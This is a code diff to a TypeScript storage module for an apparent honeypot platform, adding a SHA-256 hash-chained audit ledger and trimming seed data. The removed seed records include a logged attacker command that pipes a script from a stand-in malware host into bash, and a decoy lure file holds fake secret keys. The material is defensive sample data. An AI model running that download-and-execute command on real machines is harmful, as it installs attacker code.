@@ -1,6 +1,16 @@
 import { AttackerProfile, BeaconEvent, HoneypotProfile, LureDocument, SessionEvent } from '@/shared/types';
+import crypto from 'crypto';
 import fs from 'fs';
 import path from 'path';
+
+export interface AuditBlock {
+  blockIndex: number;
+  timestamp: string;
+  action: string;
+  payloadHash: string;
+  previousHash: string;
+  blockHash: string;
+}
 
 interface DatabaseSchema {
   honeypots: HoneypotProfile[];
@@ -8,11 +18,28 @@ interface DatabaseSchema {
   attackerProfiles: AttackerProfile[];
   lures: LureDocument[];
   beacons: BeaconEvent[];
-  lureContents: Record<string, string>; // lureId -> raw document content
-  auditLog: Array<{ id: string; timestamp: string; action: string; hash: string }>;
+  lureContents: Record<string, string>;
+  auditLedger: AuditBlock[];
 }
 
 const DB_PATH = path.join(process.cwd(), 'data', 'ciphernest-store.json');
+
+const GENESIS_PREV_HASH = '0000000000000000000000000000000000000000000000000000000000000000';
+
+function calculateBlockHash(
+  blockIndex: number,
+  timestamp: string,
+  action: string,
+  payloadHash: string,
+  previousHash: string
+): string {
+  const content = `${blockIndex}:${timestamp}:${action}:${payloadHash}:${previousHash}`;
+  return crypto.createHash('sha256').update(content).digest('hex');
+}
+
+const initialTimestamp = new Date(Date.now() - 86400000 * 5).toISOString();
+const genesisPayloadHash = crypto.createHash('sha256').update('GENESIS_BLOCK_CIPHERNEST_INIT').digest('hex');
+const genesisBlockHash = calculateBlockHash(0, initialTimestamp, 'GENESIS_INITIALIZATION', genesisPayloadHash, GENESIS_PREV_HASH);
 
 const INITIAL_SEED: DatabaseSchema = {
   honeypots: [
@@ -44,20 +71,6 @@ const INITIAL_SEED: DatabaseSchema = {
       totalEventsCount: 89,
       createdAt: new Date(Date.now() - 86400000 * 2).toISOString(),
     },
-    {
-      id: 'hp-dionaea-03',
-      name: 'Malware Trap (Dionaea)',
-      type: 'Dionaea',
-      status: 'stopped',
-      port: 445,
-      ip: '127.0.0.1',
-      containerId: 'doc-9c8b7a6f',
-      twinSyncEnabled: false,
-      temporalJitterMs: 150,
-      activeSessionsCount: 0,
-      totalEventsCount: 23,
-      createdAt: new Date(Date.now() - 86400000).toISOString(),
-    },
   ],
   events: [
     {
@@ -81,39 +94,6 @@ const INITIAL_SEED: DatabaseSchema = {
           executionDelayMs: 340,
           entropyScore: 3.84,
         },
-        {
-          id: 'cmd-2',
-          sessionId: 'sess-88a91b',
-          honeypotId: 'hp-cowrie-01',
-          timestamp: new Date(Date.now() - 880000).toISOString(),
-          command: 'uname -a',
-          output: 'Linux cipher-node-01 6.8.0-40-generic #40-Ubuntu SMP PREEMPT_DYNAMIC UTC 2026 x86_64 GNU/Linux',
-          executionDelayMs: 210,
-          entropyScore: 3.12,
-        },
-      ],
-    },
-    {
-      id: 'evt-102',
-      sessionId: 'sess-99b82c',
-      honeypotId: 'hp-customllm-02',
-      honeypotName: 'AI-Native Dynamic Decoy (CustomLLM)',
-      attackerIp: '45.142.214.7',
-      location: 'St. Petersburg, Russia',
-      kind: 'malware_drop',
-      payload: 'curl -s http://malware-drop.cx/agent.sh | bash',
-      timestamp: new Date(Date.now() - 3600000 * 4).toISOString(),
-      commands: [
-        {
-          id: 'cmd-3',
-          sessionId: 'sess-99b82c',
-          honeypotId: 'hp-customllm-02',
-          timestamp: new Date(Date.now() - 3600000 * 4).toISOString(),
-          command: 'curl -s http://malware-drop.cx/agent.sh | bash',
-          output: 'Downloading payload... [OK]\nExecuting agent script...\nPermission denied.',
-          executionDelayMs: 580,
-          entropyScore: 4.45,
-        },
       ],
     },
   ],
@@ -136,26 +116,6 @@ const INITIAL_SEED: DatabaseSchema = {
         toolSignature: 'Autonomous LLM Agent / Agentic Red Team Runner',
         timezoneEstimate: 'UTC+02:00',
         botProbability: 0.98,
-      },
-    },
-    {
-      id: 'atk-profile-214',
-      ip: '45.142.214.7',
-      classification: 'HumanOperator',
-      confidence: 0.81,
-      firstSeenAt: new Date(Date.now() - 86400000 * 2).toISOString(),
-      lastSeenAt: new Date(Date.now() - 3600000 * 4).toISOString(),
-      totalSessions: 3,
-      totalCommands: 19,
-      timingJitterAvgMs: 2400,
-      mitreTechniques: ['T1105 (Ingress Tool Transfer)', 'T1068 (Exploitation for Privilege Escalation)'],
-      threatLevel: 'High',
-      behavioralDNA: {
-        commandVelocityPerMin: 4.2,
-        typoFrequencyScore: 0.14,
-        toolSignature: 'Manual Interactive SSH / Custom Bash Scripts',
-        timezoneEstimate: 'UTC+03:00',
-        botProbability: 0.12,
       },
     },
   ],
@@ -191,12 +151,14 @@ const INITIAL_SEED: DatabaseSchema = {
   lureContents: {
     'lure-doc-01': 'Employee,Title,Salary,Bonus,Vault_Passkey\nJohn Doe,CEO,280000,45000,sk_live_ceokey_89f1a2c4\nJane Smith,CTO,240000,35000,sk_live_ctokey_3e4d5c6b\n/* \u200B\u200C\u200B\u200C META:CN-WM-89F1A2C4 */',
   },
-  auditLog: [
+  auditLedger: [
     {
-      id: 'audit-001',
-      timestamp: new Date(Date.now() - 86400000 * 5).toISOString(),
-      action: 'SYSTEM_INITIALIZATION',
-      hash: '0x9f8a7b6c5d4e3f2a1b0c9d8e7f6a5b4c3d2e1f0a',
+      blockIndex: 0,
+      timestamp: initialTimestamp,
+      action: 'GENESIS_INITIALIZATION',
+      payloadHash: genesisPayloadHash,
+      previousHash: GENESIS_PREV_HASH,
+      blockHash: genesisBlockHash,
     },
   ],
 };
@@ -214,7 +176,12 @@ function ensureDbExists(): DatabaseSchema {
 
   try {
     const raw = fs.readFileSync(DB_PATH, 'utf-8');
-    return JSON.parse(raw) as DatabaseSchema;
+    const parsed = JSON.parse(raw) as DatabaseSchema;
+    if (!parsed.auditLedger || parsed.auditLedger.length === 0) {
+      parsed.auditLedger = INITIAL_SEED.auditLedger;
+      fs.writeFileSync(DB_PATH, JSON.stringify(parsed, null, 2), 'utf-8');
+    }
+    return parsed;
   } catch {
     fs.writeFileSync(DB_PATH, JSON.stringify(INITIAL_SEED, null, 2), 'utf-8');
     return INITIAL_SEED;
@@ -228,4 +195,55 @@ export function readDb(): DatabaseSchema {
 export function writeDb(data: DatabaseSchema): void {
   ensureDbExists();
   fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2), 'utf-8');
+}
+
+export function appendAuditBlock(action: string, payload: unknown): AuditBlock {
+  const db = readDb();
+  const lastBlock = db.auditLedger[db.auditLedger.length - 1] || INITIAL_SEED.auditLedger[0];
+  const blockIndex = lastBlock.blockIndex + 1;
+  const timestamp = new Date().toISOString();
+  const previousHash = lastBlock.blockHash;
+  const payloadHash = crypto.createHash('sha256').update(JSON.stringify(payload)).digest('hex');
+
+  const blockHash = calculateBlockHash(blockIndex, timestamp, action, payloadHash, previousHash);
+
+  const newBlock: AuditBlock = {
+    blockIndex,
+    timestamp,
+    action,
+    payloadHash,
+    previousHash,
+    blockHash,
+  };
+
+  db.auditLedger.push(newBlock);
+  writeDb(db);
+
+  return newBlock;
+}
+
+export function verifyAuditChain(): { verified: boolean; blockCount: number; rootHash: string; invalidBlockIndex?: number } {
+  const db = readDb();
+  const ledger = db.auditLedger;
+
+  if (!ledger || ledger.length === 0) {
+    return { verified: false, blockCount: 0, rootHash: 'none' };
+  }
+
+  for (let i = 0; i < ledger.length; i++) {
+    const block = ledger[i];
+    const expectedPrevHash = i === 0 ? GENESIS_PREV_HASH : ledger[i - 1].blockHash;
+
+    if (block.previousHash !== expectedPrevHash) {
+      return { verified: false, blockCount: ledger.length, rootHash: ledger[ledger.length - 1].blockHash, invalidBlockIndex: i };
+    }
+
+    const calculated = calculateBlockHash(block.blockIndex, block.timestamp, block.action, block.payloadHash, block.previousHash);
+
+    if (calculated !== block.blockHash) {
+      return { verified: false, blockCount: ledger.length, rootHash: ledger[ledger.length - 1].blockHash, invalidBlockIndex: i };
+    }
+  }
+
+  return { verified: true, blockCount: ledger.length, rootHash: ledger[ledger.length - 1].blockHash };
 }
